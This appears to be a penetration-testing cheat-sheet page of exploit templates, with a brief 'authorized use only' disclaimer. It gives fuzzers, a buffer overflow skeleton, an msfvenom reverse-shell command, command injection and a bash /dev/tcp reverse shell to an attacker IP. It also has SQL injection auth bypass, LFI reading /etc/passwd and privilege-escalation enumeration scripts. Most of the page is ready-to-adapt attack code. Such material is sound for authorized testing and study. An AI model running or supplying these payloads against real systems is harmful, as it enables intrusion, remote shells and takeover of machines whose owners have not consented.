---
icon: gopuram
---

# Exploit Template Snippets

## **Exploit Template Snippets ‚Äî Build, Fire, Pwn**

> ‚ö†Ô∏è For **educational and authorized use only.**\
> These templates are designed to help you understand exploit logic, structure, and automation ‚Äî not for unauthorized testing.

***

### I. üß© Exploit Workflow Anatomy

| Phase                      | Action                                                |
| -------------------------- | ----------------------------------------------------- |
| **1. Enumeration**         | Identify service, port, version, input vector.        |
| **2. Fuzzing**             | Trigger crash with payload.                           |
| **3. Debugging**           | Attach debugger (gdb/Immunity).                       |
| **4. Exploit Development** | Build PoC (controlled crash ‚Üí EIP control ‚Üí RCE).     |
| **5. Weaponization**       | Add reverse shell, privilege escalation, persistence. |

***

### II. üß† Python Exploit Template ‚Äî TCP / Socket PoC

```python
#!/usr/bin/env python3
import socket, sys, time

target = "10.10.10.5"
port = 1337

payload = b"A" * 100  # initial fuzz buffer

print(f"[+] Connecting to {target}:{port}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

print("[+] Sending payload...")
s.send(payload)
print("[+] Payload sent. Check target.")
s.close()
```

***

### III. üß± Python Fuzzing Skeleton

```python
#!/usr/bin/env python3
import socket, time

ip = "10.10.10.5"
port = 9999
buffer = b"A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(buffer)
        print(f"[+] Sent {len(buffer)} bytes")
        s.close()
        time.sleep(1)
        buffer += b"A" * 100
    except:
        print(f"[!] Crashed at {len(buffer)} bytes!")
        break
```

‚úÖ Use this to find offset/crash point with `!mona pattern_create/pattern_offset`.

***

### IV. üß† Buffer Overflow Skeleton (Python)

```python
#!/usr/bin/env python3
import socket, sys

target = "10.10.10.5"
port = 9999

offset = 524
retn = b"\xf3\x12\x17\x31"  # little endian (jmp esp)
nop = b"\x90" * 16
shellcode = b""  # msfvenom payload goes here

payload = b"A" * offset + retn + nop + shellcode

print(f"[+] Sending exploit to {target}:{port}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(payload)
s.close()
```

#### üîπ Example msfvenom command

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -b "\x00" -f python
```

***

### V. ‚öôÔ∏è Bash Exploit Template (Network)

```bash
#!/bin/bash
# Basic socket exploit example
host="10.10.10.5"
port=8080
payload="GET /vuln?cmd=id HTTP/1.1\r\nHost: $host\r\n\r\n"

echo -e "$payload" | nc $host $port
```

***

### VI. üß† Exploit Skeleton ‚Äî Web Command Injection

```python
import requests

url = "http://target/vuln.php"
cmd = "id"

payload = {"cmd": f"$( {cmd} )"}
r = requests.post(url, data=payload)

print(r.text)
```

**Enhancements:**

* Add threading for brute-force.
* Integrate reverse shell or file upload for escalation.

***

### VII. üß© Exploit Skeleton ‚Äî Format String

```python
#!/usr/bin/env python3
import socket, struct

def p(x): return struct.pack("<I", x)

target = ("10.10.10.5", 1337)
payload = b"%p " * 10  # test for format string vuln

s = socket.socket()
s.connect(target)
s.send(payload)
print(s.recv(4096))
s.close()
```

***

### VIII. üß± C Exploit Skeleton (Linux Socket)

```c
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(){
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr("10.10.10.5");
    server.sin_family = AF_INET;
    server.sin_port = htons(1337);

    connect(s, (struct sockaddr *)&server, sizeof(server));
    char payload[512];
    memset(payload, 'A', 512);
    send(s, payload, strlen(payload), 0);
    close(s);
    return 0;
}
```

Compile:

```bash
gcc exploit.c -o exploit
```

***

### IX. üß† Python Exploit Template ‚Äî Auth Bypass / SQLi

```python
import requests

url = "http://target/login"
payload = "' OR '1'='1"
data = {"username": payload, "password": "pass"}

r = requests.post(url, data=data)
if "Welcome" in r.text:
    print("[+] Auth bypass successful")
else:
    print("[-] Failed")
```

***

### X. üß© Exploit Template ‚Äî Command Injection ‚Üí Reverse Shell

```python
import requests
target = "http://10.10.10.5/vuln"
lhost = "10.10.14.3"
lport = "4444"

cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
payload = {"cmd": cmd}
requests.post(target, data=payload)
```

***

### XI. ‚öôÔ∏è Exploit Template ‚Äî LFI to RCE

```python
import requests

url = "http://target/vuln?file="
file = "../../../../../../etc/passwd"

r = requests.get(url + file)
print(r.text)
```

Combine with `/proc/self/environ` or PHP session inclusion for RCE.

***

### XII. üß© Privilege Escalation Automation Skeleton (Linux)

```bash
#!/bin/bash
echo "[+] Starting PrivEsc..."
whoami
sudo -l
find / -perm -4000 2>/dev/null
find / -type f -writable 2>/dev/null
cat /etc/crontab
getcap -r / 2>/dev/null
echo "[+] Done."
```

***

### XIII. ‚ö° Exploit Output Parsing Template

```python
import subprocess, re

output = subprocess.check_output("nmap -sV target", shell=True, text=True)
matches = re.findall(r"(\d+)/tcp\s+open\s+(\S+)", output)
for port, service in matches:
    print(f"[+] Port {port} running {service}")
```

***

### XIV. üß† Exploit Development Checklist

| Step | Description                          |
| ---- | ------------------------------------ |
| 1Ô∏è‚É£  | Fuzz the input (crash discovery)     |
| 2Ô∏è‚É£  | Find offset (EIP overwrite)          |
| 3Ô∏è‚É£  | Identify bad chars                   |
| 4Ô∏è‚É£  | Find JMP ESP or pivot gadget         |
| 5Ô∏è‚É£  | Build payload (shellcode + NOP sled) |
| 6Ô∏è‚É£  | Validate with debugger               |
| 7Ô∏è‚É£  | Automate exploitation                |
| 8Ô∏è‚É£  | Add reverse shell or file write      |

***

### XV. üß± Useful Libraries for Exploit Dev

| Library      | Purpose                          |
| ------------ | -------------------------------- |
| `pwntools`   | Exploit development & automation |
| `requests`   | Web-based exploits               |
| `socket`     | Network connections              |
| `struct`     | Packing/unpacking addresses      |
| `subprocess` | Local command execution          |
| `re`         | Regex parsing for responses      |
| `ctypes`     | Low-level binary handling        |

***

### XVI. ‚ö° Pwntools Example Template

```python
from pwn import *

target = process('./vuln')
context(arch='amd64', os='linux')

offset = 72
payload = flat({offset: p64(0xdeadbeef)})

target.sendline(payload)
target.interactive()
```

***
